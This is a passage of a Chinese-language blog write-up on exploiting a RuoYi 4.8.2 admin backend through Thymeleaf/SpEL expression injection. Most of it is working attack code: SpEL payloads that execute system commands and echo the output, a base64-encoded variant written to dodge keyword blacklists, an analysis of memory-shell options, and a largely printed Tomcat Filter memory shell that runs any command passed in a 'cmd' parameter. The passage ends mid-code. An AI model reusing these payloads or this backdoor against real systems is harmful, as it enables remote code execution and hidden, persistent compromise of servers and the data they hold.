class="hljs-keyword">import</span> java.util.Scanner;<br><span class="hljs-keyword">import</span> java.io.InputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> org.apache.commons.lang3.reflect.MethodUtils;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">POCRestored</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">execute</span><span class="hljs-params">(javax.servlet.http.HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <br>        <span class="hljs-comment">// 1. 获取 Runtime 并执行命令 (RCE 核心)</span><br>        <span class="hljs-comment">// 对应 POC 中的 Runtime.getRuntime().exec(&#x27;whoami&#x27;)</span><br>        java.lang.<span class="hljs-type">Runtime</span> <span class="hljs-variable">runtime</span> <span class="hljs-operator">=</span> java.lang.Runtime.getRuntime();<br>        java.lang.<span class="hljs-type">Process</span> <span class="hljs-variable">process</span> <span class="hljs-operator">=</span> runtime.exec(<span class="hljs-string">&quot;whoami&quot;</span>);<br><br>        <span class="hljs-comment">// 2. JDK 17+ 强封装绕过</span><br>        <span class="hljs-comment">// POC 没有直接调用 process.getInputStream()，因为那会返回私有的 ProcessImpl 类导致报错。</span><br>        <span class="hljs-comment">// 它通过反射从[公共类 java.lang.Process]中提取 getInputStream 方法。</span><br>        Class&lt;?&gt; processClass = Class.forName(<span class="hljs-string">&quot;java.lang.Process&quot;</span>);<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">getInputStreamMethod</span> <span class="hljs-operator">=</span> processClass.getMethod(<span class="hljs-string">&quot;getInputStream&quot;</span>);<br>        <br>        <span class="hljs-comment">// 在 process 实例上调用这个[来自公共父类]的方法，从而避开 ProcessImpl 的访问限制。</span><br>        <span class="hljs-type">InputStream</span> <span class="hljs-variable">is</span> <span class="hljs-operator">=</span> (InputStream) getInputStreamMethod.invoke(process);<br><br>        <span class="hljs-comment">// 3. 反射构造 Scanner (绕过关键字扫描)</span><br>        <span class="hljs-comment">// 对应 POC 中的 Scanner.getConstructor(InputStream.class).newInstance(is)</span><br>        Class&lt;?&gt; scannerClass = Class.forName(<span class="hljs-string">&quot;java.util.Scanner&quot;</span>);<br>        Constructor&lt;?&gt; scannerConstructor = scannerClass.getConstructor(InputStream.class);<br>        <span class="hljs-type">Scanner</span> <span class="hljs-variable">scanner</span> <span class="hljs-operator">=</span> (Scanner) scannerConstructor.newInstance(is);<br><br>        <span class="hljs-comment">// 4. 使用 MethodUtils 代理调用 Scanner 方法 (绕过 Thymeleaf ACL 黑名单)</span><br>        <span class="hljs-comment">// 这里的 new MethodUtils() 纯粹是为了避开 SpEL 中 T() 关键字的扫描。</span><br>        <span class="hljs-type">MethodUtils</span> <span class="hljs-variable">mu</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MethodUtils</span>(); <br>        <br>        <span class="hljs-comment">// 等价于: scanner.useDelimiter(&quot;\\A&quot;)</span><br>        mu.invokeMethod(scanner, <span class="hljs-string">&quot;useDelimiter&quot;</span>, <span class="hljs-string">&quot;\\A&quot;</span>);<br>        <br>        <span class="hljs-comment">// 等价于: String result = scanner.next();</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> (String) mu.invokeMethod(scanner, <span class="hljs-string">&quot;next&quot;</span>);<br><br>        <span class="hljs-comment">// 5. 结果回显</span><br>        <span class="hljs-comment">// 对应 POC 中的 #response.getWriter().print(...)</span><br>        response.getWriter().print(result);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>带变量的简单payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs plain">$__|&#123;#response.getWriter().print(&#123;<br>#MethodUtils=&quot;&quot;.getClass().forName(&#x27;org.apache.commons.lang3.reflect.MethodUtils&#x27;).newInstance(),<br>#Scanner_class=&#x27;&#x27;.getClass().forName(&#x27;java.util.Scanner&#x27;).getConstructor(&#x27;&#x27;.getClass().forName(&#x27;java.io.InputStream&#x27;)),<br>#Rt_class=&quot;&quot;.getClass().forName(&#x27;java.lang.Runtime&#x27;),<br>#Rt_obj=#MethodUtils.invokeStaticMethod(#Rt_class,&#x27;getRuntime&#x27;),<br>#r=#MethodUtils.invokeMethod(#Rt_obj,&#x27;exec&#x27;,&#x27;whoami&#x27;),<br>#BufferedInputStream=&#x27;&#x27;.getClass().forName(&quot;java.lang.Process&quot;).getMethod(&quot;getInputStream&quot;).invoke(#r),<br>#Scanner_obj=#Scanner_class.newInstance(#BufferedInputStream),<br>#MethodUtils.invokeMethod(#Scanner_obj,&#x27;useDelimiter&#x27;,&#x27;\\A&#x27;).next()<br>&#125;)&#125;|__<br></code></pre></td></tr></table></figure>
+
+<p><img src="/./img/ruoyi4-8-2/1778643736554-f587ede6-1d26-44a8-a88b-7b344dccc8ff.png" srcset="/img/loading.gif" lazyload></p>
+<h4 id="编码poc："><a href="#编码poc：" class="headerlink" title="编码poc："></a>编码poc：</h4><p>如果有些命令很复杂，需要base64加密后，解码执行，那么就需要再加一个base64解码模块。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.Base64;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">test2</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">base64Str</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;SGVsbG8gUnVvWWk=&quot;</span>; <span class="hljs-comment">// &quot;Hello RuoYi&quot; 的 Base64</span><br><br>        <span class="hljs-comment">// 解码</span><br>        <span class="hljs-type">byte</span>[] decodedBytes = Base64.getDecoder().decode(base64Str);<br><br>        <span class="hljs-comment">// 转换为字符串</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(decodedBytes);<br><br>        System.out.println(result);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plain">&#x27;&#x27;.getClass().getConstructor(<br>    &#x27;&#x27;.getClass().forName(&#x27;[B&#x27;)<br>).newInstance(<br>    &#123;&#x27;&#x27;.getClass().forName(&#x27;java.util.Base64&#x27;).getMethod(&#x27;getDecoder&#x27;).invoke(null).decode(&#x27;d2hvYW1p&#x27;)&#125;<br>)<br></code></pre></td></tr></table></figure>
+
+<p>这里每一行都要说一下，</p>
+<ol>
+<li><code>&#39;&#39;.getClass().getConstructor( </code>：获取String的有参构造方法，这里不使用forName(‘java.lang.String’)的原因是’’.getClass()获取到的就是java.lang.String类。</li>
+<li><code>&#39;&#39;.getClass().forName(&#39;[B&#39;)</code>：尝试过参数填’’.getClass().forName(bytes.class),代码中可以，表达式中不行，这里[B就代表bytes.class</li>
+<li><code>&#123;&#39;&#39;.getClass().forName(&#39;java.util.Base64&#39;).getMethod(&#39;getDecoder&#39;).invoke(null).decode(&#39;d2hvYW1p&#39;)&#125;</code>：</li>
+</ol>
+<p>这里直接使用<code>&#39;&#39;.getClass().forName(&#39;java.util.Base64&#39;).getMethod(&#39;getDecoder&#39;).invoke(null).decode(&#39;d2hvYW1p&#39;)</code>会报错。</p>
+<p><strong>失败的根本原因：可变参数（Varargs）的坑。</strong></p>
+<p><code>java.lang.reflect.Constructor.newInstance(Object... initargs)</code> 是一个<strong>可变参数</strong>方法。</p>
+<ul>
+<li>当调用 <code>newInstance(arg)</code> 时，Java 预期的是一个对象数组，数组里的每一个元素对应构造函数的一个参数。</li>
+<li>而 <code>decode</code> 方法返回的是一个 <code>byte[]</code>（字节数组）。</li>
+<li><strong>冲突点</strong>：当把 <code>byte[]</code> 传给 <code>newInstance</code> 时，反射引擎会产生歧义：它是要把这个 <code>byte[]</code> 当作<strong>一个整体参数</strong>传给 <code>String(byte[])</code> 构造函数呢？还是认为这个 <code>byte[]</code> 本身就是<strong>参数列表</strong>，尝试把数组里的每一个 <code>byte</code> 拆出来传给构造函数？</li>
+</ul>
+<p>通常在这种动态解析环境下，它会尝试拆分数组，结果发现找不到一个有那么多 <code>byte</code> 参数的 <code>String</code> 构造函数（比如 <code>whoami</code> 解码后是 6 个字节，它会去找有 6 个 <code>byte</code> 参数的构造器），于是报错。</p>
+<p>所以需要明确告诉 <code>newInstance</code>：<strong>“这个字节数组是一个整体，是第一个参数”</strong>。 在SPEL表达式中，可以使用<code>&#123;&#125;</code>来表示列表，外面套一层<code>&#123;&#125;</code>就行。</p>
+<p><img src="/./img/ruoyi4-8-2/1778581708729-ce04f4b1-d13c-43c8-ad76-55aa3145ca4d.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs plain">fragment=__|$$&#123;#response.getWriter().print(<br>    &#x27;&#x27;.getClass().forName(&#x27;org.apache.commons.lang3.reflect.MethodUtils&#x27;).newInstance().invokeMethod(<br>        &#x27;&#x27;.getClass().forName(&#x27;java.util.Scanner&#x27;).getConstructor(<br>            &#x27;&#x27;.getClass().forName(&#x27;java.io.InputStream&#x27;)<br>        ).newInstance(<br>            &#x27;&#x27;.getClass().forName(&quot;java.lang.Process&quot;).getMethod(&quot;getInputStream&quot;).invoke(<br>                &#x27;&#x27;.getClass().forName(&#x27;org.apache.commons.lang3.reflect.MethodUtils&#x27;).newInstance().invokeMethod(<br>                        &#x27;&#x27;.getClass().forName(&#x27;org.apache.commons.lang3.reflect.MethodUtils&#x27;).newInstance().invokeStaticMethod(<br>                            &#x27;&#x27;.getClass().forName(&#x27;java.lang.Runtime&#x27;),<br>                            &#x27;getRuntime&#x27;<br>                        ),<br>                        &#x27;exec&#x27;,<br>                        &#x27;&#x27;.getClass().getConstructor(<br>                            &#x27;&#x27;.getClass().forName(&#x27;[B&#x27;)<br>                        ).newInstance(<br>                            &#123;&#x27;&#x27;.getClass().forName(&#x27;java.util.Base64&#x27;).getDecoder().decode(&#x27;d2hvYW1p&#x27;)&#125;<br>                        )<br>                )<br>            )<br>        ),<br>        &#x27;useDelimiter&#x27;,<br>        &#x27;\\A&#x27;<br>    ).next()<br>)&#125;|__<br></code></pre></td></tr></table></figure>
+
+<p><img src="/./img/ruoyi4-8-2/1778582141706-96cef6ab-5697-4533-acc8-48a225ce851a.png" srcset="/img/loading.gif" lazyload></p>
+<p>带变量的更简单的payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs plain">$__|&#123;#response.getWriter().print(&#123;<br>#MethodUtils=&quot;&quot;.getClass().forName(&#x27;org.apache.commons.lang3.reflect.MethodUtils&#x27;).newInstance(),<br>#Scanner_class=&#x27;&#x27;.getClass().forName(&#x27;java.util.Scanner&#x27;).getConstructor(&#x27;&#x27;.getClass().forName(&#x27;java.io.InputStream&#x27;)),<br>#Rt_class=&quot;&quot;.getClass().forName(&#x27;java.lang.Runtime&#x27;),<br>#Rt_obj=#MethodUtils.invokeStaticMethod(#Rt_class,&#x27;getRuntime&#x27;),<br>#String_class=&#x27;&#x27;.getClass().getConstructor(&#x27;&#x27;.getClass().forName(&#x27;[B&#x27;)),<br>#Cmd_bytes=&#123;&#x27;&#x27;.getClass().forName(&#x27;java.util.Base64&#x27;).getDecoder().decode(&#x27;d2hvYW1p&#x27;)&#125;,<br>#Cmd_string=#String_class.newInstance(#Cmd_bytes),<br>#r=#MethodUtils.invokeMethod(#Rt_obj,&#x27;exec&#x27;,#Cmd_string),<br>#BufferedInputStream=&#x27;&#x27;.getClass().forName(&quot;java.lang.Process&quot;).getMethod(&quot;getInputStream&quot;).invoke(#r),<br>#Scanner_obj=#Scanner_class.newInstance(#BufferedInputStream),<br>#MethodUtils.invokeMethod(#Scanner_obj,&#x27;useDelimiter&#x27;,&#x27;\\A&#x27;).next()<br>&#125;)&#125;|__<br></code></pre></td></tr></table></figure>
+
+<p><img src="/./img/ruoyi4-8-2/1778643897690-cd6bd6e0-e280-416e-964a-084235fe733f.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="内存马"><a href="#内存马" class="headerlink" title="内存马"></a>内存马</h2><h3 id="内存马的选择"><a href="#内存马的选择" class="headerlink" title="内存马的选择"></a>内存马的选择</h3><p>我们来深度剖析一下若依的技术栈：</p>
+<ul>
+<li><strong>基础框架</strong>：Spring Boot</li>
+<li><strong>Web 框架</strong>：Spring MVC</li>
+<li><strong>Web 容器</strong>：默认使用 Spring Boot 内置的 Tomcat</li>
+<li><strong>安全框架</strong>：Spring Security（较新版本）或 Apache Shiro（老版本或特定分支）</li>
+</ul>
+<h4 id="一、-针对-Spring-MVC-层（框架级内存马）"><a href="#一、-针对-Spring-MVC-层（框架级内存马）" class="headerlink" title="一、 针对 Spring MVC 层（框架级内存马）"></a>一、 针对 Spring MVC 层（框架级内存马）</h4><p>若依的核心业务逻辑全部依赖 Spring MVC 的路由分发。因此，Spring 层的内存马是完全兼容的。</p>
+<ol>
+<li><strong>Controller &#x2F; RequestMapping 内存马</strong></li>
+</ol>
+<ul>
+<li><strong>实现逻辑</strong>：攻击者通过反射获取若依应用上下文中的 <code>RequestMappingHandlerMapping</code> Bean，动态注册一个恶意的路由（例如 <code>/monitor/server/info_test</code>），使其指向攻击者自定义的后门方法。</li>
+<li><strong>实战痛点</strong>：<strong>会被若依的安全框架拦截</strong>，若依配置了严格的 Spring Security 或 Shiro 鉴权拦截器。如果攻击者只注册了一个普通的 Controller 路由，当外部请求访问时，会先经过鉴权过滤器。如果没有合法的 Token&#x2F;Cookie，请求直接被拦截重定向到登录页。但其实无关紧要，因为这个洞就是后台洞&#x3D;-&#x3D;</li>
+<li><strong>绕过手段</strong>：攻击者在注册 Controller 时，必须同时修改 Spring Security 的白名单配置，或者利用框架层更靠前的拦截器。</li>
+</ul>
+<ol start="2">
+<li><strong>Interceptor（拦截器）内存马</strong></li>
+</ol>
+<ul>
+<li><strong>实现逻辑</strong>：向 Spring MVC 的拦截器链中动态插入一个拦截器。只要请求匹配到了 Spring MVC 的 <code>DispatcherServlet</code>，就会触发该拦截器执行恶意代码。</li>
+</ul>
+<h4 id="二、-针对-Web-容器层（Tomcat-内存马）"><a href="#二、-针对-Web-容器层（Tomcat-内存马）" class="headerlink" title="二、 针对 Web 容器层（Tomcat 内存马）"></a>二、 针对 Web 容器层（Tomcat 内存马）</h4><p>因为若依基于 Spring Boot，绝大多数情况下是以 <code>java -jar</code> 运行，内部嵌套了 Tomcat。因此，最经典的容器级内存马不仅适用，而且<strong>往往是攻击者的首选</strong>。</p>
+<ol>
+<li><strong>Filter 内存马</strong></li>
+</ol>
+<ul>
+<li><strong>为什么是首选</strong>：前面提到，Spring Security 的拦截机制本质上也是基于 <code>Filter</code>（具体叫做 <code>FilterChainProxy</code>）实现的。攻击者通过反射获取到内置 Tomcat 的 <code>StandardContext</code> 后，可以强行将自己的恶意 Filter 注入到 Tomcat 的 Filter 链中，并且<strong>排在 Spring Security 的 Filter 之前</strong>。</li>
+<li><strong>实战效果</strong>：请求到达服务器时，先被恶意 Filter 捕获并执行命令，执行完后直接阻断请求或伪装成正常响应返回。这样就完美绕过了若依的各种认证、权限校验和日志记录模块。</li>
+</ul>
+<ol start="2">
+<li><strong>Listener 内存马 &amp; Valve 内存马</strong></li>
+</ol>
+<ul>
+<li><strong>优势</strong>：这两者的执行层级比 Filter 还要底层。特别是 Valve（阀门）内存马，它属于 Tomcat 核心处理管道的一部分。由于若依完全不会在业务代码中触碰 Valve，这类内存马在若依系统中隐蔽性极强，常规的业务层安全审计根本看不到它。</li>
+</ul>
+<h4 id="三、-针对底层的-JVM-级内存马"><a href="#三、-针对底层的-JVM-级内存马" class="headerlink" title="三、 针对底层的 JVM 级内存马"></a>三、 针对底层的 JVM 级内存马</h4><ol>
+<li><strong>Java Agent 内存马</strong></li>
+</ol>
+<ul>
+<li><strong>实战场景</strong>：如果防守方使用了类似 RASP（运行时应用自保护）或者一些高级的 WebShell 查杀工具定期扫描 Tomcat 的 Filter&#x2F;Servlet 映射表，传统的容器内存马就会暴露。</li>
+<li><strong>在若依中的应用</strong>：黑客可能会将 Java Agent 注入到若依的核心类中。例如，直接修改若依的 <code>TokenService.java</code>（负责 JWT 校验的类）的字节码，或者修改 Tomcat 的 <code>ApplicationFilterChain</code> 字节码。这样不用新增任何路由或过滤器，只需在 HTTP 请求中带上特定特征，被修改的系统自带类就会悄悄执行系统命令。</li>
+</ul>
+<p>这里我选择Tomcat的Filter内存马，并且由于我本地使用的jdk版本是17，所以这里借用unknown的内存马：</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/un1novvn/Java-unser-utils-17/tree/master">https://github.com/un1novvn/Java-unser-utils-17/tree/master</a></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//适用于jdk17+</span><br><span class="hljs-keyword">package</span> com.Memshell.tomcat;<br><br><span class="hljs-keyword">import</span> org.apache.catalina.Context;<br><span class="hljs-keyword">import</span> org.apache.catalina.core.ApplicationFilterConfig;<br><span class="hljs-keyword">import</span> org.apache.catalina.core.StandardContext;<br><span class="hljs-keyword">import</span> org.apache.catalina.loader.WebappClassLoaderBase;<br><span class="hljs-keyword">import</span> org.apache.catalina.webresources.StandardRoot;<br><span class="hljs-keyword">import</span> org.apache.tomcat.util.descriptor.web.FilterDef;<br><span class="hljs-keyword">import</span> org.apache.tomcat.util.descriptor.web.FilterMap;<br><span class="hljs-keyword">import</span> sun.reflect.ReflectionFactory;<br><br><span class="hljs-keyword">import</span> javax.servlet.*;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.PrintWriter;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Scanner;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FilterShell</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Filter</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> &lt;T&gt; T <span class="hljs-title function_">createWithConstructor</span><span class="hljs-params">(Class&lt;T&gt; classToInstantiate, Class&lt;? <span class="hljs-built_in">super</span> T&gt; constructorClass, Class&lt;?&gt;[] consArgTypes, Object[] consArgs)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        Constructor&lt;? <span class="hljs-built_in">super</span> T&gt; objCons = constructorClass.getDeclaredConstructor(consArgTypes);<br>        objCons.setAccessible(<span class="hljs-literal">true</span>);<br>        Constructor&lt;?&gt; sc = ReflectionFactory.getReflectionFactory().newConstructorForSerialization(classToInstantiate, objCons);<br>        sc.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-keyword">return</span> (T) sc.newInstance(consArgs);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Field <span class="hljs-title function_">getField</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Class&lt;?&gt; clazz, <span class="hljs-keyword">final</span> String fieldName)</span> &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            field = clazz.getDeclaredField(fieldName);<br>            field.setAccessible(<span class="hljs-literal">true</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (NoSuchFieldException ex) &#123;<br>            <span class="hljs-keyword">if</span> (clazz.getSuperclass() != <span class="hljs-literal">null</span>)<br>                field = getField(clazz.getSuperclass(), fieldName);<br>        &#125;<br>        <span class="hljs-keyword">return</span> field;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">getFieldValue</span><span class="hljs-params">(Object obj,String fieldname)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> getField(obj.getClass(), fieldname);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> field.get(obj);<br>        <span class="hljs-keyword">return</span> o;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">FilterShell</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        <span class="hljs-type">WebappClassLoaderBase</span> <span class="hljs-variable">webappClassLoaderBase</span> <span class="hljs-operator">=</span> (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();<br>        <span class="hljs-type">StandardRoot</span> <span class="hljs-variable">resources</span> <span class="hljs-operator">=</span> (StandardRoot) getFieldValue(webappClassLoaderBase, <span class="hljs-string">&quot;resources&quot;</span>);<br>        <span class="hljs-type">StandardContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> (StandardContext) resources.getContext();<br><br>        <span class="hljs-type">String</span> <span class="hljs-variable">filterName</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;fffff&quot;</span>;<br><br>        <span class="hljs-comment">//构造FilterMap</span><br>        <span class="hljs-type">FilterMap</span> <span class="hljs-variable">filterMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FilterMap</span>();<br>        filterMap.setFilterName(filterName);<br>        filterMap.addURLPattern(<span class="hljs-string">&quot;/*&quot;</span>);<br><br>        <span class="hljs-comment">//构造FilterDef</span><br>        <span class="hljs-type">FilterDef</span> <span class="hljs-variable">filterDef</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FilterDef</span>();<br>        filterDef.setFilterName(filterName);<br>        filterDef.setFilter(<span class="hljs-built_in">this</span>);<br><br>        <span class="hljs-comment">//通过反射机制获取构造器，然后创建对象</span><br>        <span class="hljs-type">ApplicationFilterConfig</span> <span class="hljs-variable">applicationFilterConfig</span> <span class="hljs-operator">=</span> createWithConstructor(<br>            ApplicationFilterConfig.class, ApplicationFilterConfig.class,<br>            <span class="hljs-comment">//形参类型</span><br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Context.class, FilterDef.class&#125;,<br>            <span class="hljs-comment">//实参</span><br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;context, filterDef&#125;<br>        );<br><br>        <span class="hljs-comment">//获取到context里的filterConfigs，然后将applicationFilterConfig加入</span><br>        HashMap&lt;String, ApplicationFilterConfig&gt; filterConfigs = (HashMap&lt;String, ApplicationFilterConfig&gt; )getFieldValue(context, <span class="hljs-string">&quot;filterConfigs&quot;</span>);<br>        filterConfigs.put(filterName,applicationFilterConfig);<br><br>        context.addFilterDef(filterDef);<br>        context.addFilterMap(filterMap);<br><br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">(FilterConfig filterConfig)</span> <span class="hljs-keyword">throws</span> ServletException &#123;<br><br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doFilter</span><span class="hljs-params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="hljs-keyword">throws</span> IOException, ServletException &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">arg0</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);<br>            <span class="hljs-keyword">if</span> (arg0 != <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-type">PrintWriter</span> <span class="hljs-variable">writer</span> <span class="hljs-operator">=</span> response.getWriter();<br>                <span class="hljs-type">String</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span>;<br>                ProcessBuilder p;<br>                <span class="hljs-keyword">if</span> (System.getProperty(<span class="hljs-string">&quot;os.name&quot;</span>).toLowerCase().contains(<span class="hljs-string">&quot;win&quot;</span>)) &#123;<br>                    p = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProcessBuilder</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;cmd.exe&quot;</span>, <span class="hljs-string">&quot;/c&quot;</span>, arg0&#125;);<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    p = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProcessBuilder</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;/bin/sh&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, arg0&#125;);<br>                &#125;<br><br>                <span class="hljs-type">Scanner</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> (<span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(p.start().getInputStream())).useDelimiter(<span class="hljs-string">&quot;\\A&quot;</span>);<br>                o = c.hasNext() ? c.next() : o;<br>                